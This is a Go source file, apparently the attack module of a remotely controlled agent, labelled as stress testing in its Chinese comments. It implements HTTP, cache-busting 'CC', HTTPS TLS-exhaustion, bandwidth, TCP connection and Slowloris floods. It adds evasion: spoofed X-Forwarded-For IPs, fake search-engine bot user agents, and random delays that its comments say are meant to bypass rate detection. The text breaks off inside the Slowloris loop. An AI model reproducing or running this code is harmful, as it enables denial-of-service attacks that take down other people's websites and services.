package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
)

// StressConfig 压力测试配置
type StressConfig struct {
	URL         string            `json:"url"`
	Method      string            `json:"method"`
	Mode        string            `json:"mode"` // http_flood | bandwidth | tcp_flood | cc
	Headers     map[string]string `json:"headers"`
	Body        string            `json:"body"`
	Concurrency int               `json:"concurrency"` // 并发数 (最高 50000)
	Duration    int               `json:"duration"`    // 持续时间(秒)
	TotalReqs   int               `json:"totalReqs"`   // 总请求数(0=按时间)
	KeepAlive   bool              `json:"keepAlive"`   // 是否复用连接
	BodySize    int               `json:"bodySize"`    // bandwidth 模式：每次发送的 KB 数
	RateLimit   int               `json:"rateLimit"`   // 限速(req/s, 0=不限)
}

// StressProgress 实时进度上报
type StressProgress struct {
	Sent       int64   `json:"sent"`
	Success    int64   `json:"success"`
	Errors     int64   `json:"errors"`
	RPS        float64 `json:"rps"`
	AvgLatency float64 `json:"avgLatency"`
	MinLatency float64 `json:"minLatency"`
	MaxLatency float64 `json:"maxLatency"`
	BytesSent  int64   `json:"bytesSent"` // 字节
	BytesRecv  int64   `json:"bytesRecv"`
	MbpsSent   float64 `json:"mbpsSent"`   // 发送速率 Mbps
	MbpsRecv   float64 `json:"mbpsRecv"`   // 接收速率 Mbps
	ActiveConn int64   `json:"activeConn"` // 当前活跃连接
	Running    bool    `json:"running"`
}

// 随机 User-Agent 池（30+ 覆盖主流浏览器/设备/爬虫）
var userAgents = []string{
	// Chrome Windows
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	// Chrome Mac
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	// Safari
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	// Firefox
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
	"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
	// Edge
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
	// Opera
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
	// Mobile
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.53 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	// Chrome Linux
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	// Bots（混入少量伪装搜索引擎）
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
	// Misc
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Vivaldi/6.7.3329.41",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Brave/125",
}

// 随机 Referer 池
var referers = []string{
	"https://www.google.com/search?q=",
	"https://www.baidu.com/s?wd=",
	"https://www.bing.com/search?q=",
	"https://search.yahoo.com/search?p=",
	"https://www.google.com.hk/search?q=",
	"https://www.sogou.com/web?query=",
	"https://www.so.com/s?q=",
	"https://duckduckgo.com/?q=",
}

// DNS 缓存
var dnsCache sync.Map // host -> []string (IPs)

func cachedDialContext(dialer *net.Dialer) func(ctx context.Context, network, addr string) (net.Conn, error) {
	return func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, port, err := net.SplitHostPort(addr)
		if err != nil {
			return dialer.DialContext(ctx, network, addr)
		}
		if cached, ok := dnsCache.Load(host); ok {
			ips := cached.([]string)
			ip := ips[rand.Intn(len(ips))]
			return dialer.DialContext(ctx, network, net.JoinHostPort(ip, port))
		}
		ips, err := net.LookupHost(host)
		if err != nil || len(ips) == 0 {
			return dialer.DialContext(ctx, network, addr)
		}
		dnsCache.Store(host, ips)
		ip := ips[rand.Intn(len(ips))]
		return dialer.DialContext(ctx, network, net.JoinHostPort(ip, port))
	}
}

// 随机字符串（用于 CC 缓存穿透）
const randChars = "abcdefghijklmnopqrstuvwxyz0123456789"

func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = randChars[rand.Intn(len(randChars))]
	}
	return string(b)
}

var stressRunner struct {
	mu      sync.Mutex
	cancel  context.CancelFunc
	running bool
	taskID  string
}

// raiseOpenFilesLimit 在 Linux 上提升系统限制
func raiseOpenFilesLimit() {
	if runtime.GOOS != "linux" {
		return
	}
	// 提升文件描述符限制
	exec.Command("bash", "-c", "ulimit -n 65535 2>/dev/null").Run()
	// 放宽临时端口范围 + 开启 TIME_WAIT 复用（需要 root）
	exec.Command("sysctl", "-w", "net.ipv4.ip_local_port_range=1024 65535").Run()
	exec.Command("sysctl", "-w", "net.ipv4.tcp_tw_reuse=1").Run()
}

func handleStressStart(conn *websocket.Conn, writeMu *sync.Mutex, msg AgentMessage) {
	var config StressConfig
	if err := json.Unmarshal(msg.Payload, &config); err != nil {
		log.Printf("压测配置解析失败: %v", err)
		return
	}

	if config.Method == "" {
		config.Method = "GET"
	}
	if config.Mode == "" {
		config.Mode = "http_flood"
	}
	if config.Concurrency <= 0 {
		config.Concurrency = 100
	}
	if config.Concurrency > 50000 {
		config.Concurrency = 50000
	}
	if config.Duration <= 0 && config.TotalReqs <= 0 {
		config.Duration = 30
	}
	if config.BodySize <= 0 {
		config.BodySize = 64 // 默认 64KB
	}

	stressRunner.mu.Lock()
	if stressRunner.running && stressRunner.cancel != nil {
		stressRunner.cancel()
		time.Sleep(500 * time.Millisecond)
	}
	ctx, cancel := context.WithCancel(context.Background())
	stressRunner.cancel = cancel
	stressRunner.running = true
	stressRunner.taskID = msg.ID
	stressRunner.mu.Unlock()

	// 提升系统限制
	raiseOpenFilesLimit()

	log.Printf("压力测试开始: mode=%s url=%s concurrency=%d duration=%ds",
		config.Mode, config.URL, config.Concurrency, config.Duration)

	go runStress(ctx, conn, writeMu, msg.ID, config)
}

func handleStressStop(msg AgentMessage) {
	stressRunner.mu.Lock()
	defer stressRunner.mu.Unlock()
	if stressRunner.running && stressRunner.cancel != nil {
		stressRunner.cancel()
		log.Printf("压力测试已手动停止")
	}
}

func runStress(ctx context.Context, conn *websocket.Conn, writeMu *sync.Mutex, taskID string, config StressConfig) {
	defer func() {
		stressRunner.mu.Lock()
		stressRunner.running = false
		stressRunner.cancel = nil
		stressRunner.mu.Unlock()
	}()

	var (
		totalSent    int64
		totalSuccess int64
		totalErrors  int64
		totalLatency int64
		minLatency   int64 = int64(time.Hour)
		maxLatency   int64
		bytesSent    int64
		bytesRecv    int64
		activeConn   int64
	)

	workerCtx, workerCancel := context.WithCancel(ctx)
	defer workerCancel()

	// 定时结束
	if config.Duration > 0 {
		go func() {
			select {
			case <-time.After(time.Duration(config.Duration) * time.Second):
				workerCancel()
			case <-workerCtx.Done():
			}
		}()
	}

	var wg sync.WaitGroup

	switch config.Mode {
	case "tcp_flood":
		runTCPFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	case "bandwidth":
		runBandwidthFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	case "https_flood":
		runHTTPSFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	default: // http_flood, cc
		runHTTPFlood(workerCtx, &wg, config, &totalSent, &totalSuccess, &totalErrors,
			&totalLatency, &minLatency, &maxLatency, &bytesSent, &bytesRecv, &activeConn)
	}

	// 进度上报
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var lastSent, lastBytesSent, lastBytesRecv int64
	startTime := time.Now()

	done := make(chan struct{})
	go func() { wg.Wait(); close(done) }()

	for {
		select {
		case <-ticker.C:
			sent := atomic.LoadInt64(&totalSent)
			bs := atomic.LoadInt64(&bytesSent)
			br := atomic.LoadInt64(&bytesRecv)

			rps := float64(sent - lastSent)
			mbpsSent := float64(bs-lastBytesSent) * 8 / 1e6
			mbpsRecv := float64(br-lastBytesRecv) * 8 / 1e6
			lastSent = sent
			lastBytesSent = bs
			lastBytesRecv = br

			p := makeProgress(sent, &totalSuccess, &totalErrors, &totalLatency,
				&minLatency, &maxLatency, rps, bs, br, mbpsSent, mbpsRecv, &activeConn, true)
			sendStressMsg(conn, writeMu, "stress_progress", taskID, p)

		case <-done:
			goto finish
		}
	}

finish:
	sent := atomic.LoadInt64(&totalSent)
	elapsed := time.Since(startTime).Seconds()
	if elapsed < 0.001 {
		elapsed = 0.001
	}
	bs := atomic.LoadInt64(&bytesSent)
	br := atomic.LoadInt64(&bytesRecv)
	avgRPS := float64(sent) / elapsed
	avgMbpsSent := float64(bs) * 8 / 1e6 / elapsed
	avgMbpsRecv := float64(br) * 8 / 1e6 / elapsed

	final := makeProgress(sent, &totalSuccess, &totalErrors, &totalLatency,
		&minLatency, &maxLatency, avgRPS, bs, br, avgMbpsSent, avgMbpsRecv, &activeConn, false)
	sendStressMsg(conn, writeMu, "stress_done", taskID, final)

	log.Printf("压力测试完成: mode=%s sent=%d success=%d errors=%d avgRPS=%.0f sent=%.1fMB recv=%.1fMB",
		config.Mode, sent, atomic.LoadInt64(&totalSuccess), atomic.LoadInt64(&totalErrors),
		avgRPS, float64(bs)/1e6, float64(br)/1e6)
}

// ========== HTTP Flood / CC 模式 ==========
func runHTTPFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	isHTTPS := strings.HasPrefix(strings.ToLower(config.URL), "https://")
	dialer := &net.Dialer{Timeout: 3 * time.Second, KeepAlive: 30 * time.Second}
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
		ClientSessionCache: tls.NewLRUClientSessionCache(1024),
	}
	transport := &http.Transport{
		TLSClientConfig:       tlsCfg,
		MaxIdleConnsPerHost:   config.Concurrency,
		MaxConnsPerHost:       0, // 不限制
		DisableKeepAlives:     !config.KeepAlive,
		IdleConnTimeout:       10 * time.Second,
		ResponseHeaderTimeout: 5 * time.Second,
		TLSHandshakeTimeout:   5 * time.Second,
		ForceAttemptHTTP2:     isHTTPS, // HTTPS 启用 HTTP/2，HTTP 用 1.1
		DialContext:           cachedDialContext(dialer),
	}
	clientTimeout := 5 * time.Second
	if isHTTPS {
		clientTimeout = 10 * time.Second
	}
	client := &http.Client{
		Timeout:   clientTimeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	isCC := config.Mode == "cc"
	// 预分配 body 字节（复用）
	var bodyBytes []byte
	if config.Body != "" {
		bodyBytes = []byte(config.Body)
	}

	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				var bodyReader io.Reader
				bodyLen := 0
				if bodyBytes != nil {
					bodyLen = len(bodyBytes)
					bodyReader = bytes.NewReader(bodyBytes)
				}

				targetURL := config.URL
				if isCC {
					// CC 模式：多维度缓存穿透
					sep := "?"
					if strings.Contains(targetURL, "?") {
						sep = "&"
					}
					targetURL = fmt.Sprintf("%s%s_=%s&r=%s&t=%d",
						targetURL, sep, randStr(8), randStr(6), time.Now().UnixNano())
				}

				req, err := http.NewRequestWithContext(ctx, config.Method, targetURL, bodyReader)
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(activeConn, -1)
					continue
				}

				// 随机请求头伪装
				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
				req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Referer", referers[rand.Intn(len(referers))]+randStr(5))

				if isCC {
					req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
					req.Header.Set("Pragma", "no-cache")
					fakeIP := fmt.Sprintf("%d.%d.%d.%d",
						rand.Intn(223)+1, rand.Intn(256), rand.Intn(256), rand.Intn(254)+1)
					req.Header.Set("X-Forwarded-For", fakeIP)
					req.Header.Set("X-Real-IP", fakeIP)
					req.Header.Set("X-Client-IP", fakeIP)
					// 随机微延迟 0~50ms，模拟真人节奏，绕过频率检测
					time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
				}

				for k, v := range config.Headers {
					req.Header.Set(k, v)
				}

				resp, err := client.Do(req)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(activeConn, -1)
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)
				atomic.AddInt64(bytesSent, int64(bodyLen+350))

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
				} else {
					n, _ := io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(bytesRecv, n+int64(300))
					atomic.AddInt64(totalSuccess, 1)
				}

				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== HTTPS 专用洪水模式 ==========
// 混合策略：HTTP/2 复用高 RPS + 新 TLS 连接耗尽服务端 CPU
func runHTTPSFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	// 策略分配：70% HTTP/2 复用连接（高 RPS），30% 新 TLS 连接（耗 CPU）
	h2Workers := config.Concurrency * 7 / 10
	if h2Workers < 1 {
		h2Workers = 1
	}
	tlsWorkers := config.Concurrency - h2Workers
	if tlsWorkers < 1 {
		tlsWorkers = 1
	}

	isCC := config.Mode == "cc"
	var bodyBytes []byte
	if config.Body != "" {
		bodyBytes = []byte(config.Body)
	}

	log.Printf("[HTTPS] 启动: h2Workers=%d tlsWorkers=%d url=%s", h2Workers, tlsWorkers, config.URL)

	// ===== 策略1: HTTP/2 复用连接，高吞吐 =====
	h2Dialer := &net.Dialer{Timeout: 5 * time.Second, KeepAlive: 30 * time.Second}
	h2Transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			ClientSessionCache: tls.NewLRUClientSessionCache(2048),
		},
		MaxIdleConnsPerHost:   h2Workers,
		MaxConnsPerHost:       0,
		DisableKeepAlives:     false, // 保持连接复用
		IdleConnTimeout:       30 * time.Second,
		ResponseHeaderTimeout: 10 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ForceAttemptHTTP2:     true, // 启用 HTTP/2
		DialContext:           cachedDialContext(h2Dialer),
	}
	h2Client := &http.Client{
		Timeout:   15 * time.Second,
		Transport: h2Transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for i := 0; i < h2Workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				var bodyReader io.Reader
				bodyLen := 0
				if bodyBytes != nil {
					bodyLen = len(bodyBytes)
					bodyReader = bytes.NewReader(bodyBytes)
				}

				targetURL := config.URL
				if isCC {
					sep := "?"
					if strings.Contains(targetURL, "?") {
						sep = "&"
					}
					targetURL = fmt.Sprintf("%s%s_=%s&r=%s&t=%d",
						targetURL, sep, randStr(8), randStr(6), time.Now().UnixNano())
				}

				req, err := http.NewRequestWithContext(ctx, config.Method, targetURL, bodyReader)
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(activeConn, -1)
					continue
				}

				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
				req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Referer", referers[rand.Intn(len(referers))]+randStr(5))
				for k, v := range config.Headers {
					req.Header.Set(k, v)
				}

				resp, err := h2Client.Do(req)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(activeConn, -1)
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)
				atomic.AddInt64(bytesSent, int64(bodyLen+350))

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
				} else {
					n, _ := io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(bytesRecv, n+int64(300))
					atomic.AddInt64(totalSuccess, 1)
				}
				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}

	// ===== 策略2: 每次新建 TLS 连接（不复用），耗尽服务端 TLS 握手资源 =====
	for i := 0; i < tlsWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				// 每次创建全新的 transport，强制新 TLS 握手
				freshDialer := &net.Dialer{Timeout: 5 * time.Second}
				freshTransport := &http.Transport{
					TLSClientConfig: &tls.Config{
						InsecureSkipVerify: true,
						// 不使用 session cache，强制完整 TLS 握手
					},
					DisableKeepAlives:     true, // 禁用复用
					ResponseHeaderTimeout: 10 * time.Second,
					TLSHandshakeTimeout:   10 * time.Second,
					ForceAttemptHTTP2:     true,
					DialContext:           cachedDialContext(freshDialer),
				}
				freshClient := &http.Client{
					Timeout:   15 * time.Second,
					Transport: freshTransport,
					CheckRedirect: func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					},
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				targetURL := config.URL
				if isCC {
					sep := "?"
					if strings.Contains(targetURL, "?") {
						sep = "&"
					}
					targetURL = fmt.Sprintf("%s%s_=%s&t=%d",
						targetURL, sep, randStr(10), time.Now().UnixNano())
				}

				req, err := http.NewRequestWithContext(ctx, config.Method, targetURL, nil)
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(activeConn, -1)
					freshTransport.CloseIdleConnections()
					continue
				}

				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				for k, v := range config.Headers {
					req.Header.Set(k, v)
				}

				resp, err := freshClient.Do(req)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(activeConn, -1)
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)
				atomic.AddInt64(bytesSent, int64(350))

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
				} else {
					n, _ := io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(bytesRecv, n+int64(300))
					atomic.AddInt64(totalSuccess, 1)
				}

				freshTransport.CloseIdleConnections()
				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== 带宽洪水模式 ==========
func runBandwidthFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	// 生成大 payload（预分配，所有 goroutine 共享只读）
	payloadSize := config.BodySize * 1024
	if payloadSize > 10*1024*1024 {
		payloadSize = 10 * 1024 * 1024
	}
	if payloadSize < 1024 {
		payloadSize = 64 * 1024
	}
	payload := make([]byte, payloadSize)
	rand.Read(payload)

	isHTTPS := strings.HasPrefix(strings.ToLower(config.URL), "https://")
	// HTTPS 强制开启 KeepAlive，避免每次请求都做 TLS 握手
	keepAlive := config.KeepAlive || isHTTPS
	dialer := &net.Dialer{Timeout: 5 * time.Second, KeepAlive: 30 * time.Second}
	tlsCfg := &tls.Config{
		InsecureSkipVerify: true,
		ClientSessionCache: tls.NewLRUClientSessionCache(2048),
	}
	transport := &http.Transport{
		TLSClientConfig:       tlsCfg,
		MaxIdleConnsPerHost:   config.Concurrency,
		MaxConnsPerHost:       0,
		DisableKeepAlives:     !keepAlive,
		IdleConnTimeout:       30 * time.Second,
		ResponseHeaderTimeout: 10 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ForceAttemptHTTP2:     isHTTPS,
		DialContext:           cachedDialContext(dialer),
	}
	client := &http.Client{
		Timeout:   15 * time.Second,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// 随机 boundary 用于伪装 multipart 上传
	boundary := "----WebKitFormBoundary" + randStr(16)
	contentType := "multipart/form-data; boundary=" + boundary

	log.Printf("[Bandwidth] 启动: url=%s isHTTPS=%v keepAlive=%v payload=%dKB concurrency=%d",
		config.URL, isHTTPS, keepAlive, payloadSize/1024, config.Concurrency)

	for i := 0; i < config.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				req, err := http.NewRequestWithContext(ctx, "POST", config.URL, bytes.NewReader(payload))
				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(totalSent, 1)
					atomic.AddInt64(activeConn, -1)
					continue
				}
				// 伪装成正常文件上传请求
				req.Header.Set("Content-Type", contentType)
				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
				req.Header.Set("Accept", "*/*")
				req.Header.Set("Accept-Encoding", "gzip, deflate, br")
				req.Header.Set("Origin", config.URL)
				req.Header.Set("Referer", config.URL)

				resp, err := client.Do(req)
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(activeConn, -1)
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
				} else {
					// 请求成功到达服务器（不管返回码），计入发送字节
					atomic.AddInt64(bytesSent, int64(payloadSize+400))
					n, _ := io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(bytesRecv, n+int64(300))
					atomic.AddInt64(totalSuccess, 1)
				}

				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}
}

// ========== TCP 连接洪水（自动适配 HTTPS/TLS）==========
func runTCPFlood(ctx context.Context, wg *sync.WaitGroup, config StressConfig,
	totalSent, totalSuccess, totalErrors, totalLatency, minLat, maxLat, bytesSent, bytesRecv, activeConn *int64) {

	isHTTPS := strings.HasPrefix(strings.ToLower(config.URL), "https://")

	// 从 URL 提取 host:port
	target := config.URL
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}
	if !strings.Contains(target, ":") {
		if isHTTPS {
			target += ":443"
		} else {
			target += ":80"
		}
	}

	dialer := &net.Dialer{Timeout: 5 * time.Second}
	// TLS session cache 加速重复握手
	sessionCache := tls.NewLRUClientSessionCache(2048)

	// 预构建 HTTP 请求头
	hostOnly := strings.Split(target, ":")[0]
	httpReq := []byte(fmt.Sprintf("GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
		randStr(8), hostOnly, userAgents[0]))

	// 连接建立函数：HTTPS 用 TLS（带超时），HTTP 用普通 TCP
	dialConn := func() (net.Conn, error) {
		tcpConn, err := dialer.DialContext(ctx, "tcp", target)
		if err != nil {
			return nil, err
		}
		if isHTTPS {
			tlsConn := tls.Client(tcpConn, &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         hostOnly,
				ClientSessionCache: sessionCache,
			})
			// 给 TLS 握手单独设 5 秒超时，防止无限挂起
			hsCtx, hsCancel := context.WithTimeout(ctx, 5*time.Second)
			defer hsCancel()
			if err := tlsConn.HandshakeContext(hsCtx); err != nil {
				tcpConn.Close()
				return nil, err
			}
			return tlsConn, nil
		}
		return tcpConn, nil
	}

	// 一半 goroutine 做快速连接（SYN/TLS 洪水），一半做 Slowloris（占位）
	halfConc := config.Concurrency / 2
	if halfConc < 1 {
		halfConc = 1
	}

	log.Printf("[TCP] 启动: target=%s isHTTPS=%v fast=%d slow=%d", target, isHTTPS, halfConc, config.Concurrency-halfConc)

	// 快速连接模式：建连 -> 发数据 -> 立即关闭
	// HTTPS 时每次都做完整 TLS 握手，消耗服务端 CPU
	for i := 0; i < halfConc; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				conn, err := dialConn()
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(activeConn, -1)
				} else {
					atomic.AddInt64(totalSuccess, 1)
					n, _ := conn.Write(httpReq)
					atomic.AddInt64(bytesSent, int64(n))
					conn.Close()
					atomic.AddInt64(activeConn, -1)
				}

				updateMinMax(minLat, maxLat, latency)
			}
		}()
	}

	// Slowloris 模式：建连后缓慢发送数据，长期占用服务端连接
	for i := 0; i < config.Concurrency-halfConc; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				atomic.AddInt64(activeConn, 1)
				start := time.Now()

				conn, err := dialConn()
				latency := time.Since(start).Nanoseconds()
				atomic.AddInt64(totalSent, 1)
				atomic.AddInt64(totalLatency, latency)

				if err != nil {
					atomic.AddInt64(totalErrors, 1)
					atomic.AddInt64(activeConn, -1)
					updateMinMax(minLat, maxLat, latency)
					continue
				}

				atomic.AddInt64(totalSuccess, 1)
				// 发送不完整的 HTTP 头，保持连接打开
				header := fmt.Sprintf("GET /?%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
					randStr(8), hostOnly, userAgents[rand.Intn(len(userAgents))])
				conn.Write([]byte(header))
				atomic.AddInt64(bytesSent, int64(len(header)))

				// 每 5 秒发送一个额外头保持连接不超时
				for j := 0; j < 12; j++ {
					select {
					case <-ctx.Done():
						conn.Close()
						atomic.AddInt64(activeConn, -1)
						return
